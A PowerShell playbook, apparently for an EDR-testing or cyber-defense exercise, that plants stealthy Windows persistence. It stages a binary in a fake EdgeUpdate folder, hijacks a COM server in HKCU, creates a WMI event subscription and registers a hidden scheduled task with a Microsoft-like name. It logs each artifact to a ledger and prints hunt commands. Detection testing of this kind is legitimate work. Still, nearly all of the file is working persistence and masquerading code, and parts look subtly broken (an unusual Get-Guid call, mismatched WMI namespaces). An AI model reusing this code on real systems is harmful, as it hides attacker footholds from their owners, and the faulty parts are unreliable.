# wb1-stealth-persist.ps1 -- ADVANCED STEALTH PERSISTENCE playbook (Windows)
# Plants persistence in LOW-VISIBILITY locations to stress the EDR's
# persistence auditor. Every artifact is written to the operator ledger.
#
# Steps:
#   1. COM hijack: HKCU CLSID shadow with InprocServer32 into a user path
#   2. WMI event subscription: timer filter + command consumer
#   3. Randomized-name scheduled task pointing at the benign beacon
#
# Edit the CONFIG block, run as admin on a PRACTICE box.

# ------------------------------------------------------------- CONFIG
$Marker   = "ccdc-pb1"                                # ledger tag
$TaskName = "MicrosoftEdgeUpdateCore_$((Get-Random)%97)"   # blends in
$CLSID    = "{7C857801-35A9-4C0F-$((Get-Random)%9999)-A2B4C5D6E7F8}"
$PayloadDir = "$env:LOCALAPPDATA\Microsoft\EdgeUpdate"     # plausible dir
$Beacon   = "$PayloadDir\core.exe"                          # copied benign binary
# ---------------------------------------------------------------------

$ErrorActionPreference = "Stop"
$Ledger = "$PSScriptRoot\..\ledger.jsonl"
function Ledger($step, $artifact) {
    $e = @{ ts = [int](Get-Date -UFormat %s); playbook = $Marker; step = $step;
            artifact = $artifact } | ConvertTo-Json -Compress
    Add-Content -Path $Ledger -Value $e
}

# ---- STEP 0: payload staging (a real PE at a plausible path) ------------
New-Item -ItemType Directory -Force -Path $PayloadDir | Out-Null
$src = Get-ChildItem "$PSScriptRoot\..\..\tests\bin\implant.exe" -ErrorAction SilentlyContinue
if (-not $src) { $src = Get-ChildItem "$env:SystemRoot\System32\where.exe" }
Copy-Item $src.FullName $Beacon -Force
Ledger "stage" $Beacon

# ---- STEP 1: COM hijack (HKCU shadow; EDR target: PERS-COM) ------------
$inproc = "HKCU:\Software\Classes\CLSID\$CLSID\InprocServer32"
New-Item -Path $inproc -Force | Out-Null
Set-ItemProperty -Path $inproc -Name "(Default)" -Value $Beacon
Set-ItemProperty -Path $inproc -Name "ThreadingModel" -Value "Apartment"
Ledger "com-hijack" "HKCU:\Software\Classes\CLSID\$CLSID"

# ---- STEP 2: WMI event subscription (EDR target: PERS-WMI-SUB) ---------
$filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "_{$((Get-Guid).Guid)}"; EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 2100 WHERE TargetInstance ISA 'Win32_LocalTime'"
}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{
    Name = "_{$((Get-Guid).Guid)}"
    CommandLineTemplate = "`"$env:SystemRoot\System32\cmd.exe`" /c start /b `"`" `"$Beacon`""
}
Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter; Consumer = $consumer
} | Out-Null
Ledger "wmi-sub" ($filter.Name + " -> " + $consumer.Name)

# ---- STEP 3: randomized scheduled task (EDR target: PERS-TASK) ----------
$action  = New-ScheduledTaskAction -Execute $Beacon
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(3) `
             -RepetitionInterval (New-TimeSpan -Minutes 37)
Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger `
    -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden) | Out-Null
Ledger "scheduled-task" "\Microsoft\Windows\$TaskName"

Write-Host "== wb1 planted. Hunt them via the EDR Alerts screen or:"
Write-Host "   ledger: $Ledger"
Write-Host "   1. reg query HKCU\Software\Classes\CLSID\$CLSID /s"
Write-Host "   2. Get-WmiObject __EventFilter,CommandLineEventConsumer -Namespace root\subscription"
Write-Host "   3. schtasks /query /fo LIST | findstr $TaskName"
Write-Host "cleanup: .\wcleanup.ps1"
